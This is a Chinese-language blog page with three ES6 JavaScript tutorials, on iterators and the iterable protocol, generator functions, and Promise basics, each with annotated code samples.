<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)</span><br></pre></td></tr></table></figure>

<img src="1.png" width="50%">

<p>我们再调用一下这个方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> it = arr[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>())</span><br></pre></td></tr></table></figure>

<img src="2.png" width="50%">

<p>再定义一个不可遍历的数据结构，并使用 for … of 遍历，它就会报错，错误提示就是它没有 <code>[Symbol.iterator]()</code> 方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> courses = &#123;</span><br><span class="line">  <span class="attr">allCourses</span>: &#123;</span><br><span class="line">    <span class="attr">frontend</span>: [<span class="string">&#x27;ES&#x27;</span>, <span class="string">&#x27;Vue&#x27;</span>, <span class="string">&#x27;React&#x27;</span>, <span class="string">&#x27;小程序&#x27;</span>],</span><br><span class="line">    <span class="attr">backend</span>: [<span class="string">&#x27;Java&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>, <span class="string">&#x27;C++&#x27;</span>],</span><br><span class="line">    <span class="attr">webapp</span>: [<span class="string">&#x27;Android&#x27;</span>, <span class="string">&#x27;IOS&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会报错！错误提示：Invalid attempt to iterate non-iterable instance</span></span><br><span class="line"><span class="comment">// In order to be iterable, non-array objects must have a [Symbol.iterator]() method.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> courses) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="我们在这里讲一下-可迭代协议-和-迭代器协议："><a href="#我们在这里讲一下-可迭代协议-和-迭代器协议：" class="headerlink" title="我们在这里讲一下 可迭代协议 和 迭代器协议："></a>我们在这里讲一下 可迭代协议 和 迭代器协议：</h4><p><strong>可迭代协议</strong>：如果一个数据结构具有 <code>Symbol.iterator</code> 方法，那么它就是可迭代的，否则它就是不可迭代的。如果是可迭代的，就可以使用 for … of 进行迭代。</p>
<p><strong>迭代器协议</strong>：迭代器必须返回如右所示的结构的对象：<code>&#123; next()&#123; return &#123;value, done&#125; &#125; &#125;</code></p>
<h4 id="那么有哪些数据结构原生就具备-Iterator-接口呢？"><a href="#那么有哪些数据结构原生就具备-Iterator-接口呢？" class="headerlink" title="那么有哪些数据结构原生就具备 Iterator 接口呢？"></a>那么有哪些数据结构原生就具备 Iterator 接口呢？</h4><ul>
<li>Array</li>
<li>Map</li>
<li>Set</li>
<li>String</li>
<li>TypedArray（描述的是<strong>二进制缓存区</strong>一个类似数组的视图，也叫<strong>类型数组</strong>）</li>
<li>函数的 arguments 对象</li>
<li>NodeList 对象</li>
</ul>
<h3 id="使用-Iterator-将不可遍历的数据结构改造成“可遍历”的"><a href="#使用-Iterator-将不可遍历的数据结构改造成“可遍历”的" class="headerlink" title="使用 Iterator 将不可遍历的数据结构改造成“可遍历”的"></a>使用 Iterator 将不可遍历的数据结构改造成“可遍历”的</h3><p>我们拿上面定义的 courses 作为示例。根据可迭代协议，如果想让 courses 变成可迭代的，需要给它加上 <code>Symbol.iterator</code> 方法。再根据迭代器协议的返回值要求来编写。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">courses[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> allCourse = <span class="variable language_">this</span>.<span class="property">allCourses</span></span><br><span class="line">  <span class="keyword">let</span> keys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(allCourse)</span><br><span class="line">  <span class="keyword">let</span> values = []</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!values.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keys.<span class="property">length</span>) &#123;</span><br><span class="line">          values = allCourse[keys[<span class="number">0</span>]]</span><br><span class="line">          keys.<span class="title function_">shift</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">done</span>: !values.<span class="property">length</span>, <span class="comment">// 注意把done写在前面，因为shift()会改变values的长度</span></span><br><span class="line">        <span class="attr">value</span>: values.<span class="title function_">shift</span>()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们再用 for … of 遍历，输出如下：</p>
<img src="3.png" width="35%">



<h3 id="使用-Generator-实现-Iterator"><a href="#使用-Generator-实现-Iterator" class="headerlink" title="使用 Generator 实现 Iterator"></a>使用 Generator 实现 Iterator</h3><p>上一篇博客讲到了 Generator，Generator 函数返回值是一个对象，这个对象也有 next() 方法，并且 next() 方法的返回值也是一个包含 value 和 done 属性的对象。因为我们可以使用 Generator函数 来实现 Iterator。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">courses[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] = <span class="keyword">function</span>* () &#123;</span><br><span class="line">  <span class="keyword">let</span> allCourse = <span class="variable language_">this</span>.<span class="property">allCourses</span></span><br><span class="line">  <span class="keyword">let</span> keys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(allCourse)</span><br><span class="line">  <span class="keyword">let</span> values = []</span><br><span class="line">  <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!values.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (keys.<span class="property">length</span>) &#123;</span><br><span class="line">        values = allCourse[keys[<span class="number">0</span>]]</span><br><span class="line">        keys.<span class="title function_">shift</span>()</span><br><span class="line">        <span class="keyword">yield</span> values.<span class="title function_">shift</span>()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">yield</span> values.<span class="title function_">shift</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>Iterator 是一种接口机制，为不同的数据结构提供统一访问的机制</li>
<li>Iterator 主要供 for … of 消费</li>
<li>Iterator <strong>将不支持遍历的数据结构变得“可遍历”</strong></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/24/ES021/" data-id="clur520ql0011mocc7v321x8s" data-title="（二十一）ES6：Iterator" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES/" rel="tag">ES</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ES020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/23/ES020/" class="article-date">
  <time class="dt-published" datetime="2021-03-23T08:34:52.000Z" itemprop="datePublished">2021-03-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/23/ES020/">（二十）ES6：Generator</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Generator 函数是 ES6 提供的一种异步编程解决方案。Generator函数 可以在的执行过程中暂停，然后也可以从暂停的地方继续执行。Generator 函数不能作为构造函数。</p>
<p>Generator 函数特征 ① function 关键字与函数名之间有一个 <code>*</code>；② 函数体内部使用 <code>yield</code> 表达式。</p>
<p>示例1：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">yield</span> i</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>()) <span class="comment">// Generator &#123;_invoke: ƒ&#125;</span></span><br><span class="line"><span class="comment">// 注意：Generator 此时并未执行，因为 Generator 函数需要手动执行</span></span><br><span class="line"><span class="comment">// 调用 Generator 函数的固定语法是使用 next() 方法</span></span><br><span class="line"><span class="comment">// 函数会从函数头部或上一次停下来的地方开始执行，直到遇到下一个 yield 表达式（或 return 语句）为止</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = <span class="title function_">foo</span>()</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="title function_">next</span>()) <span class="comment">// &#123;value: 0, done: false&#125;</span></span><br><span class="line"><span class="comment">// 返回的是迭代器对象</span></span><br><span class="line"><span class="comment">// value 的属性值是 yield 后面的表达式的值</span></span><br><span class="line"><span class="comment">// done 表示当前 Generator 函数是否执行完成</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="title function_">next</span>()) <span class="comment">// &#123;value: 1, done: false&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="title function_">next</span>()) <span class="comment">// &#123;value: 2, done: false&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="title function_">next</span>()) <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br><span class="line"><span class="comment">// 函数运行完毕，以后再调用 next() 方法，返回的都是这个值。</span></span><br></pre></td></tr></table></figure>

<p>注意：<code>yield</code> 表达式只能用在 Generator 函数里面，用在其他地方都会报错。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params">a</span>) &#123;</span><br><span class="line">  a.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="keyword">yield</span> item;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码也会产生句法错误，因为 <code>forEach</code> 方法的参数是一个普通函数，但是在里面使用了 <code>yield</code> 表达式。</p>
<p>Generator 函数可以不用 <code>yield</code> 表达式，这时就变成了一个单纯的暂缓执行函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;执行了！&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> generator = <span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  generator.<span class="title function_">next</span>()</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>

<p><code>yield</code> 表达式本身没有返回值，或者说总是返回 <code>undefined</code>。<code>next</code> 方法可以带一个参数，该参数就会被当作上一个 <code>yield</code> 表达式的返回值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> y = <span class="number">2</span> * (<span class="title function_">yield</span>(x + <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">let</span> z = <span class="title function_">yield</span>(y / <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> x + y + z</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> g = <span class="title function_">gen</span>(<span class="number">5</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>().<span class="property">value</span>) <span class="comment">// x为5, 输出(x+1)，即6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="number">12</span>).<span class="property">value</span>) <span class="comment">// yield(x + 1)这个yield表达式等于12，y等于24，输出(y/3)，即8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="number">13</span>).<span class="property">value</span>) <span class="comment">// yield(y / 3)这个yield表达式等于13，z等于13，输出x+y+z，即5+24+13，42</span></span><br></pre></td></tr></table></figure>

<h4 id="Generator-函数的异步应用"><a href="#Generator-函数的异步应用" class="headerlink" title="Generator 函数的异步应用"></a>Generator 函数的异步应用</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">url, callback</span>) &#123;</span><br><span class="line">  <span class="comment">// ...省略ajax请求</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="title function_">ajax</span>(url, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    getData.<span class="title function_">next</span>(res)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res1 = <span class="keyword">yield</span> <span class="title function_">request</span>(<span class="string">&#x27;a.json&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br><span class="line">  <span class="keyword">let</span> res2 = <span class="keyword">yield</span> <span class="title function_">request</span>(<span class="string">&#x27;b.json&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">  <span class="keyword">let</span> res3 = <span class="keyword">yield</span> <span class="title function_">request</span>(<span class="string">&#x27;c.json&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res3)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> getData = <span class="title function_">gen</span>()</span><br><span class="line">getData.<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure>



<img src="1.jpeg" width="50%">


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/23/ES020/" data-id="clur520ql0015moccfumdbbku" data-title="（二十）ES6：Generator" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES/" rel="tag">ES</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ES019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/22/ES019/" class="article-date">
  <time class="dt-published" datetime="2021-03-22T07:01:52.000Z" itemprop="datePublished">2021-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/22/ES019/">（十九）ES6：Promise</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p><code>Promise</code> 是异步编程的一种解决方案，它可以解决回调地狱的问题。简单来说，可以将 <code>Promise</code> 作为一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，<code>Promise</code> 是一个对象，从它可以获取异步操作的消息。有了 Promise 对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。</p>
<p><code>Promise</code> 对象代表一个异步操作，有三种状态：<code>pending</code>（进行中）、<code>fulfilled</code>（已成功）、<code>rejected</code>（已失败）。对象的状态不受外界影响，只有异步操作的结果可以决定当前是哪一种状态，其它任何操作都无法改变这个状态。</p>
<p><code>Promise</code> 对象状态的改变只有两种可能：①pending → fulfilled  ②pending → rejected。一旦状态发生改变，就不会再变了，会一直保持这个结果。如果状态已经发生了改变，再对 <code>Promise</code> 对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果即错过了它，再去监听是得不到结果的。</p>
<h2 id="二、基本用法"><a href="#二、基本用法" class="headerlink" title="二、基本用法"></a>二、基本用法</h2><p><code>Promise</code> 对象是一个构造函数，用来生成 <code>Promise</code> 实例。<code>resolve</code> 和 <code>reject</code> 是两个函数，由 JS 引擎提供。</p>
<p><code>resolve</code> 函数的作用是将 <code>Promise</code> 对象状态从“未完成”变为“成功”，在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；<code>reject</code> 函数的作用是，将 <code>Promise</code> 对象的状态从“未完成”变为“失败”，在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="comment">/* 异步操作成功 */</span>) &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(value)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">reject</span>(error)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>Promise</code> 实例生成以后，可以使用 <code>then</code> 方法分别指定异步操作成功和失败状态的回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// sucess</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// failure</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>Promise 新建后会立即执行。</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="title function_">resolve</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果为 1 3 2</span></span><br></pre></td></tr></table></figure>

<p>上述代码中，<code>Promise</code> 新建后立即执行，所以首先输出的是1。<code>then</code> 方法指定的回调函数，将在当前脚本中的所有同步任务执行完毕之后只会才会执行，所以2最后输出。</p>
<h2 id="三、静态方法"><a href="#三、静态方法" class="headerlink" title="三、静态方法"></a>三、静态方法</h2><h4 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h4><p>把参数包装成状态为 fulfilled 的 Promise 对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p) <span class="comment">// Promise &#123;&lt;fulfilled&gt;: &quot;success&quot;&#125;</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// success</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h4><p>把参数包装成状态为 rejected 的 Promise 对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p) <span class="comment">// Promise &#123;&lt;rejected&gt;: &quot;error&quot;&#125;</span></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// error</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h4><p><code>Promise.all()</code> 方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p2, p3]);</span><br></pre></td></tr></table></figure>

<p><code>Promise.all()</code> 方法接受一个数组作为参数，p1、p2、p3 都是 Promise 实例，如果不是，就会先调 <code>Promise.resolve</code> 方法，将参数转为 Promise 实例，再进一步处理。<code>Promise.all()</code> 方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。</p>
<p>p 的状态由 p1、p2、p3 决定。① 只有 p1、p2、p3 的状态都变成 fulfilled，p 的状态才会变成 fulfilled，此时 p1、p2、p3 的返回值组成一个数组，传递给 p 的回调函数；② 只要 p1、p2、p3 之中有一个被rejected，p 的状态就变成 rejected，此时第一个被 reject 的实例的返回值，会传递给 p 的回调函数。</p>
<h4 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h4><p><code>Promise.race()</code>方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">race</span>([p1, p2, p3]);</span><br></pre></td></tr></table></figure>

<p><code>Promise.race() </code>方法的参数与 <code>Promise.all()</code> 方法一样，如果不是 Promise 实例，就会先调用 <code>Promise.resolve()</code> 方法，将参数转为 Promise 实例，再进一步处理。</p>
<p>只要 p1、p2、p3 之中有一个实例率先改变状态，p 的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给 p 的回调函数。</p>
<img src="1.jpeg" width="50%">


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/22/ES019/" data-id="clur520qk000xmoccgfiibyex" data-title="（十九）ES6：Promise" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES/" rel="tag">ES</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ES/" rel="tag">ES</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ES/" style="font-size: 20px;">ES</a> <a href="/tags/HTTP/" style="font-size: 16.67px;">HTTP</a> <a href="/tags/Vue/" style="font-size: 13.33px;">Vue</a> <a href="/tags/%E7%BB%BC%E5%90%88/" style="font-size: 10px;">综合</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
